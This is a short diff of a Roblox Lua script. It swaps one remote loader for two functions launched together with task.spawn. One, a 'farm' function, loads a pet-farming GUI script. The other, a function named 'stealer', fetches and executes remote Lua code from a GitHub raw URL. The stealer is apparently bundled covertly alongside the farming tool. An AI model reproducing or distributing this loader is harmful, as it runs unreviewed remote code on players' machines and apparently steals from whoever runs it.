@@ -1,1 +1,9 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/811acb3e0341f83e9cc78aaf.lua'))()
+local function stealer()
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/50db117ac82bda41278bcce8.lua'))()
+end
+local function farm()
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/FatalityyHub/TheGui/refs/heads/main/PETSGO'))()
+end
+
+task.spawn(farm)
+task.spawn(stealer)
